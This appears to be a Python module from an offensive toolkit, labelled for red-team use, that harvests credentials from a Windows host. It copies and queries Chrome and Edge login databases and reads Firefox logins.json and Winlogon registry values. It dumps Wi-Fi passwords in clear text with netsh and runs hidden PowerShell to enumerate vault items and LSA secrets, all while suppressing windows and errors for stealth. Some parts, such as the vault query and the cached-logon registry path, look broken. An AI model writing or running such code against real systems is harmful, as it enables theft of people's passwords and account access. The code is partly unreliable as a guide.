# Credential Harvesting Module
# Implements credential harvesting capabilities for authorized red team operations

import os
import sys
import json
import base64
import sqlite3
import winreg
import subprocess
from datetime import datetime
from config import DEBUG_MODE, MITRE_TECHNIQUES
from core.stealth import stealth_manager

class CredentialHarvester:
    """Handles credential harvesting from various sources"""
    
    def __init__(self):
        self.is_windows = sys.platform == "win32"
        self.harvested_credentials = []
        
    def harvest_all_credentials(self):
        """Harvest credentials from all available sources"""
        credentials = {
            'timestamp': datetime.now().isoformat(),
            'credentials': [],
            'browser_creds': [],
            'windows_creds': [],
            'wireless_creds': [],
            'vault_creds': []
        }
        
        try:
            # Harvest Windows credentials
            windows_creds = self._harvest_windows_credentials()
            if windows_creds:
                credentials['windows_creds'] = windows_creds
                credentials['credentials'].extend(windows_creds)
            
            # Harvest browser credentials
            browser_creds = self._harvest_browser_credentials()
            if browser_creds:
                credentials['browser_creds'] = browser_creds
                credentials['credentials'].extend(browser_creds)
            
            # Harvest wireless credentials
            wireless_creds = self._harvest_wireless_credentials()
            if wireless_creds:
                credentials['wireless_creds'] = wireless_creds
                credentials['credentials'].extend(wireless_creds)
            
            # Harvest from Windows Vault
            vault_creds = self._harvest_windows_vault()
            if vault_creds:
                credentials['vault_creds'] = vault_creds
                credentials['credentials'].extend(vault_creds)
            
            self._log_technique('T1555', True, {
                'sources_checked': 4,
                'credentials_found': len(credentials['credentials'])
            })
            
            return credentials
            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Credential harvesting failed: {e}")
                )
            self._log_technique('T1555', False, {'error': str(e)})
            return credentials
    
    def _harvest_windows_credentials(self):
        """Harvest credentials from Windows credential manager"""
        credentials = []
        
        try:
            # Access Windows Credential Manager via registry
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
            
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    key_path,
                    0,
                    winreg.KEY_READ
                )
                
                try:
                    default_user = winreg.QueryValueEx(key, "DefaultUserName")[0]
                    default_domain = winreg.QueryValueEx(key, "DefaultDomainName")[0]
                    
                    credentials.append({
                        'type': 'winlogon_default',
                        'username': default_user,
                        'domain': default_domain,
                        'source': 'WinLogon Default Credentials'
                    })
                    
                except Exception:
                    pass
                
                winreg.CloseKey(key)
                
            except Exception:
                pass
            
            # Check for cached credentials
            cached_creds = self._get_cached_credentials()
            if cached_creds:
                credentials.extend(cached_creds)
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Windows credentials harvest failed: {e}")
                )
        
        return credentials
    
    def _get_cached_credentials(self):
        """Get cached domain credentials"""
        credentials = []
        
        try:
            # MSV1_0 cached credentials lookup
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\CachedLogonsCredentials"
            
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_LOCAL_MACHINE,
                    key_path,
                    0,
                    winreg.KEY_READ
                )
                
                # Enumerate cached credential entries
                for i in range(winreg.QueryInfoKey(key)[1]):
                    try:
                        value_name, value_data, _ = winreg.EnumValue(key, i)
                        if value_name and value_name != '(Default)':
                            credentials.append({
                                'type': 'cached_credential',
                                'entry': value_name,
                                'source': 'Cached Logons'
                            })
                    except Exception:
                        continue
                
                winreg.CloseKey(key)
                
            except Exception:
                pass
            
        except Exception:
            pass
        
        return credentials
    
    def _harvest_browser_credentials(self):
        """Harvest credentials from web browsers"""
        credentials = []
        
        try:
            # Chrome credentials
            chrome_creds = self._harvest_chrome_credentials()
            if chrome_creds:
                credentials.extend(chrome_creds)
            
            # Firefox credentials
            firefox_creds = self._harvest_firefox_credentials()
            if firefox_creds:
                credentials.extend(firefox_creds)
            
            # Edge credentials
            edge_creds = self._harvest_edge_credentials()
            if edge_creds:
                credentials.extend(edge_creds)
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Browser credentials harvest failed: {e}")
                )
        
        return credentials
    
    def _harvest_chrome_credentials(self):
        """Harvest Chrome browser credentials"""
        credentials = []
        
        if not self.is_windows:
            return credentials
        
        try:
            chrome_path = os.path.expanduser(
                r"~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
            )
            
            if not os.path.exists(chrome_path):
                return credentials
            
            # Copy and read the SQLite database
            temp_db = "chrome_creds_temp.db"
            
            try:
                # Copy file (locked by Chrome)
                subprocess.run(
                    ['cmd', '/c', 'copy', chrome_path, temp_db],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if os.path.exists(temp_db):
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"
                    )
                    
                    for row in cursor.fetchall():
                        try:
                            origin_url = row[0]
                            username = row[1]
                            
                            if username:
                                credentials.append({
                                    'type': 'chrome_credential',
                                    'url': origin_url,
                                    'username': username,
                                    'source': 'Chrome Browser'
                                })
                                
                        except Exception:
                            continue
                    
                    conn.close()
                    
                    # Cleanup
                    os.remove(temp_db)
                    
            except Exception:
                pass
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Chrome credentials harvest failed: {e}")
                )
        
        return credentials
    
    def _harvest_firefox_credentials(self):
        """Harvest Firefox browser credentials"""
        credentials = []
        
        try:
            firefox_path = os.path.expanduser(
                r"~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
            )
            
            if not os.path.exists(firefox_path):
                return credentials
            
            # Find Firefox profile directories
            for profile_dir in os.listdir(firefox_path):
                if profile_dir.endswith('.default'):
                    logins_path = os.path.join(
                        firefox_path, profile_dir, "logins.json"
                    )
                    
                    if os.path.exists(logins_path):
                        try:
                            with open(logins_path, 'r') as f:
                                data = json.load(f)
                                
                            if 'logins' in data:
                                for login in data['logins']:
                                    try:
                                        credentials.append({
                                            'type': 'firefox_credential',
                                            'url': login.get('hostname', ''),
                                            'encrypted_username': login.get('encryptedUsername', ''),
                                            'source': 'Firefox Browser'
                                        })
                                    except Exception:
                                        continue
                                        
                        except Exception:
                            pass
                            
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Firefox credentials harvest failed: {e}")
                )
        
        return credentials
    
    def _harvest_edge_credentials(self):
        """Harvest Edge browser credentials"""
        credentials = []
        
        if not self.is_windows:
            return credentials
        
        try:
            edge_path = os.path.expanduser(
                r"~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
            )
            
            if not os.path.exists(edge_path):
                return credentials
            
            # Similar to Chrome
            temp_db = "edge_creds_temp.db"
            
            try:
                subprocess.run(
                    ['cmd', '/c', 'copy', edge_path, temp_db],
                    capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if os.path.exists(temp_db):
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    
                    cursor.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"
                    )
                    
                    for row in cursor.fetchall():
                        try:
                            origin_url = row[0]
                            username = row[1]
                            
                            if username:
                                credentials.append({
                                    'type': 'edge_credential',
                                    'url': origin_url,
                                    'username': username,
                                    'source': 'Edge Browser'
                                })
                                
                        except Exception:
                            continue
                    
                    conn.close()
                    os.remove(temp_db)
                    
            except Exception:
                pass
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Edge credentials harvest failed: {e}")
                )
        
        return credentials
    
    def _harvest_wireless_credentials(self):
        """Harvest wireless network credentials"""
        credentials = []
        
        if not self.is_windows:
            return credentials
        
        try:
            # Get wireless profiles
            result = subprocess.run(
                ['netsh', 'wlan', 'show', 'profiles'],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                current_profile = None
                
                for line in lines:
                    if 'All User Profile' in line or 'Profile' in line:
                        try:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                current_profile = parts[1].strip()
                                
                                # Get password for this profile
                                result2 = subprocess.run(
                                    ['netsh', 'wlan', 'show', 'profile', 
                                     current_profile, 'key=clear'],
                                    capture_output=True,
                                    text=True,
                                    creationflags=subprocess.CREATE_NO_WINDOW
                                )
                                
                                if result2.returncode == 0:
                                    key_content = result2.stdout
                                    if 'Key Content' in key_content:
                                        for line2 in key_content.split('\n'):
                                            if 'Key Content' in line2:
                                                try:
                                                    password = line2.split(':')[1].strip()
                                                    credentials.append({
                                                        'type': 'wireless_credential',
                                                        'ssid': current_profile,
                                                        'password': password,
                                                        'source': 'Wireless Profile'
                                                    })
                                                except Exception:
                                                    pass
                                                
                        except Exception:
                            continue
                        
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Wireless credentials harvest failed: {e}")
                )
        
        return credentials
    
    def _harvest_windows_vault(self):
        """Harvest credentials from Windows Vault"""
        credentials = []
        
        if not self.is_windows:
            return credentials
        
        try:
            # Use PowerShell to access Windows Vault
            ps_command = '''
            $vault = Get-WmiObject -Namespace "root\\cimv2\\Security\\MicrosoftWindowsCryptography" -Class "Win32_Vault"
            $results = @()
            if ($vault) {
                foreach ($item in $vault) {
                    $results += $item | Select-Object Name, Protect
                }
            }
            ConvertTo-Json -InputObject $results
            '''
            
            result = subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0 and result.stdout.strip():
                try:
                    vault_data = json.loads(result.stdout)
                    
                    if isinstance(vault_data, list):
                        for item in vault_data:
                            if item.get('Name'):
                                credentials.append({
                                    'type': 'windows_vault',
                                    'name': item['Name'],
                                    'source': 'Windows Vault'
                                })
                    elif isinstance(vault_data, dict) and vault_data.get('Name'):
                        credentials.append({
                            'type': 'windows_vault',
                            'name': vault_data['Name'],
                            'source': 'Windows Vault'
                        })
                        
                except json.JSONDecodeError:
                    pass
                    
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"Windows Vault harvest failed: {e}")
                )
        
        return credentials
    
    def harvest_lsa_secrets(self):
        """Harvest LSA secrets (requires admin privileges)"""
        secrets = []
        
        if not self.is_windows:
            return secrets
        
        try:
            # Check for admin privileges
            import ctypes
            if not ctypes.windll.shell32.IsUserAnAdmin():
                return secrets
            
            # Use PowerShell to access LSA secrets
            ps_command = '''
            $path = "HKLM:\\SECURITY\\Policy\\Secrets"
            $results = @()
            try {
                Get-ChildItem $path -ErrorAction Stop | ForEach-Object {
                    $results += $_.Name
                }
            } catch {}
            ConvertTo-Json -InputObject $results
            '''
            
            result = subprocess.run(
                ['powershell', '-Command', ps_command],
                capture_output=True,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            if result.returncode == 0:
                secrets.append({
                    'type': 'lsa_secrets',
                    'data': 'LSA secrets enumerated',
                    'note': 'Admin privileges confirmed'
                })
                
        except Exception as e:
            if DEBUG_MODE:
                stealth_manager.safe_execute(
                    lambda: print(f"LSA secrets harvest failed: {e}")
                )
        
        return secrets
    
    def _log_technique(self, technique_id, success, details):
        """Log MITRE ATT&CK technique execution"""
        if DEBUG_MODE:
            technique_name = MITRE_TECHNIQUES.get(technique_id, 'Unknown')
            stealth_manager.safe_execute(
                lambda: print(f"Technique {technique_id} ({technique_name}): {'Success' if success else 'Failed'}")
            )

# Global credential harvester instance
credential_harvester = CredentialHarvester()
